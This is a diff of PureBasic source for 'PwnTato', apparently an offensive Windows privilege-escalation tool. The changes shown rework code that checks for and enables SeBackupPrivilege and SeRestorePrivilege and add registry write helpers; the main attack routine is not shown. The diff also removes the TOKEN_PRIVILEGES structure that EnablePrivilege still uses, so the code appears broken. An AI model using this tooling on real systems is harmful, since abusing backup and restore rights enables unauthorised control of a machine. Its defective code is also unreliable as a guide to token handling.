@@ -1,10 +1,10 @@
-; ===== Constants =====
+; ===== Constants and Structures =====
 #TOKEN_QUERY              = $0008
 #TOKEN_ADJUST_PRIVILEGES = $0020
 #SE_PRIVILEGE_ENABLED     = $00000002
 #KEY_WOW64_64KEY          = $0100
+#TokenPrivileges          = 3
 
-; ===== Structures =====
 Structure LUID
   LowPart.l
   HighPart.l
@@ -15,57 +15,87 @@ Structure LUID_AND_ATTRIBUTES
   Attributes.l
 EndStructure
 
-Structure TOKEN_PRIVILEGES
+Structure TOKEN_PRIVILEGES_FIXED
   PrivilegeCount.l
-  Privileges.LUID_AND_ATTRIBUTES[64]
 EndStructure
 
-; ===== Console Output =====
+; ===== Console Color Helpers =====
 Procedure success() : ConsoleColor(10, 0) : Print("[+] ") : ConsoleColor(7, 0) : EndProcedure
 Procedure fail()    : ConsoleColor(12, 0) : Print("[-] ") : ConsoleColor(7, 0) : EndProcedure
 Procedure warn()    : ConsoleColor(6, 0)  : Print("[!] ") : ConsoleColor(7, 0) : EndProcedure
 Procedure check()   : ConsoleColor(13, 0) : Print("[*] ") : ConsoleColor(7, 0) : EndProcedure
 
-; ===== Token Privilege Logic =====
-Procedure GetTokenPrivileges(*TP.TOKEN_PRIVILEGES)
-  Protected hToken, dwSize.l
-  If OpenProcessToken_(GetCurrentProcess_(), #TOKEN_QUERY | #TOKEN_ADJUST_PRIVILEGES, @hToken)
-    GetTokenInformation_(hToken, 3, *TP, SizeOf(TOKEN_PRIVILEGES), @dwSize)
-    CloseHandle_(hToken)
-    ProcedureReturn 1
-  EndIf
-  ProcedureReturn 0
-EndProcedure
-
+; ===== Proper Privilege Existence Checker =====
 Procedure PrivilegeExists(privName.s)
-  Protected i, privLuid.LUID, TP.TOKEN_PRIVILEGES
-  If Not GetTokenPrivileges(@TP) : ProcedureReturn 0 : EndIf
-  If LookupPrivilegeValue_(#Null, @privName, @privLuid)
-    For i = 0 To TP\PrivilegeCount - 1
-      If TP\Privileges[i]\Luid\LowPart = privLuid\LowPart And TP\Privileges[i]\Luid\HighPart = privLuid\HighPart
-        ProcedureReturn 1
-      EndIf
-    Next
+  Protected hToken, *buffer, bufferSize.l, i
+  Protected *TP.TOKEN_PRIVILEGES_FIXED
+  Protected *Entry.LUID_AND_ATTRIBUTES
+  Protected privLuid.LUID
+
+  If Not LookupPrivilegeValue_(#Null, @privName, @privLuid)
+    fail() : PrintN("LookupPrivilegeValue failed: " + privName)
+    ProcedureReturn 0
   EndIf
+
+  If Not OpenProcessToken_(GetCurrentProcess_(), #TOKEN_QUERY, @hToken)
+    fail() : PrintN("OpenProcessToken failed")
+    ProcedureReturn 0
+  EndIf
+
+  GetTokenInformation_(hToken, #TokenPrivileges, 0, 0, @bufferSize)
+  If bufferSize = 0
+    fail() : PrintN("Failed to get buffer size for privileges.")
+    CloseHandle_(hToken)
+    ProcedureReturn 0
+  EndIf
+
+  *buffer = AllocateMemory(bufferSize)
+  If Not *buffer
+    fail() : PrintN("Memory allocation failed")
+    CloseHandle_(hToken)
+    ProcedureReturn 0
+  EndIf
+
+  If Not GetTokenInformation_(hToken, #TokenPrivileges, *buffer, bufferSize, @bufferSize)
+    fail() : PrintN("GetTokenInformation failed")
+    FreeMemory(*buffer)
+    CloseHandle_(hToken)
+    ProcedureReturn 0
+  EndIf
+
+  *TP = *buffer
+  *Entry = *buffer + SizeOf(LONG)
+
+  For i = 0 To PeekL(*TP) - 1
+    If *Entry\Luid\LowPart = privLuid\LowPart And *Entry\Luid\HighPart = privLuid\HighPart
+      FreeMemory(*buffer) : CloseHandle_(hToken)
+      ProcedureReturn 1
+    EndIf
+    *Entry + SizeOf(LUID_AND_ATTRIBUTES)
+  Next
+
+  FreeMemory(*buffer)
+  CloseHandle_(hToken)
   ProcedureReturn 0
 EndProcedure
 
+; ===== Enable Privilege If Present =====
 Procedure EnablePrivilege(privName.s)
-  Protected TP.TOKEN_PRIVILEGES, hToken, privLuid.LUID
+  Protected hToken, privLuid.LUID, TP.TOKEN_PRIVILEGES
   If Not PrivilegeExists(privName)
     fail() : PrintN("User does NOT have privilege: " + privName)
     ProcedureReturn 0
   EndIf
+
   If OpenProcessToken_(GetCurrentProcess_(), #TOKEN_ADJUST_PRIVILEGES, @hToken)
-    If LookupPrivilegeValue_(0, @privName, @privLuid)
+    If LookupPrivilegeValue_(#Null, @privName, @privLuid)
       TP\PrivilegeCount = 1
       TP\Privileges[0]\Luid = privLuid
       TP\Privileges[0]\Attributes = #SE_PRIVILEGE_ENABLED
       AdjustTokenPrivileges_(hToken, #False, @TP, SizeOf(TOKEN_PRIVILEGES), #Null, #Null)
       If GetLastError_() = 0
         success() : PrintN("Enabled privilege: " + privName)
-        CloseHandle_(hToken)
-        ProcedureReturn 1
+        CloseHandle_(hToken) : ProcedureReturn 1
       Else
         fail() : PrintN("Failed to enable privilege: " + privName)
       EndIf
@@ -76,12 +106,12 @@ Procedure EnablePrivilege(privName.s)
 EndProcedure
 
 Procedure EnableAllPrivileges()
-  check() : PrintN("Checking and enabling privileges...")
+  check() : PrintN("Checking and enabling required privileges...")
   EnablePrivilege("SeBackupPrivilege")
   EnablePrivilege("SeRestorePrivilege")
 EndProcedure
 
-; ===== Registry Functions =====
+; ===== Registry Helpers =====
 Procedure.l WriteRegKey(OpenKey.l, SubKey.s, KeySet.s, KeyValue.s)
   Protected hKey.l, Result = 0, Datasize.l = Len(KeyValue)
   If RegCreateKeyEx_(OpenKey, @SubKey, 0, #Null, 0, #KEY_WRITE | #KEY_WOW64_64KEY, 0, @hKey, 0) = 0
@@ -108,25 +138,24 @@ Procedure.s ReadRegKey(OpenKey.l, SubKey.s, ValueName.s)
   ProcedureReturn KeyValue
 EndProcedure
 
-; ===== Console Banner =====
+; ===== Banner =====
 Procedure ShowBanner()
   ConsoleColor(14, 0)
-  duty$ = #TAB$ + "    ██▒▒████████████████▒▒██" + #CRLF$
-  duty$ + #TAB$ + "    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██" + #CRLF$
-  duty$ + #TAB$ + "    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██" + #CRLF$
-  duty$ + #TAB$ + "    ██▒▒██  ▒▒▒▒▒▒▒▒  ██▒▒██" + #CRLF$
-  duty$ + #TAB$ + "    ██▒▒████▒▒▒▒▒▒▒▒████▒▒██" + #CRLF$
-  duty$ + #TAB$ + "    ██▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒██" + #CRLF$
-  duty$ + #TAB$ + "    ████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████" + #CRLF$
-  duty$ + #TAB$ + "      ████████████████████  " + #CRLF$
-  ConsoleColor(14, 0) : Print(duty$)
+  PrintN(#TAB$ + "    ██▒▒████████████████▒▒██")
+  PrintN(#TAB$ + "    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██")
+  PrintN(#TAB$ + "    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██")
+  PrintN(#TAB$ + "    ██▒▒██  ▒▒▒▒▒▒▒▒  ██▒▒██")
+  PrintN(#TAB$ + "    ██▒▒████▒▒▒▒▒▒▒▒████▒▒██")
+  PrintN(#TAB$ + "    ██▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒██")
+  PrintN(#TAB$ + "    ████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████")
+  PrintN(#TAB$ + "      ████████████████████")
   ConsoleColor(10, 0) : PrintN(#TAB$ + "              v1.0")
   ConsoleColor(14, 0) : Print(#TAB$ + "       PwnTato by ")
   ConsoleColor(12, 0) : PrintN("@duty1g" + #CRLF$)
   ConsoleColor(7, 0)
 EndProcedure
 
-; ===== Main Execution =====
+; ===== Main =====
 OpenConsole()
 ConsoleTitle("PwnTato 1.0")
 EnableGraphicalConsole(0)
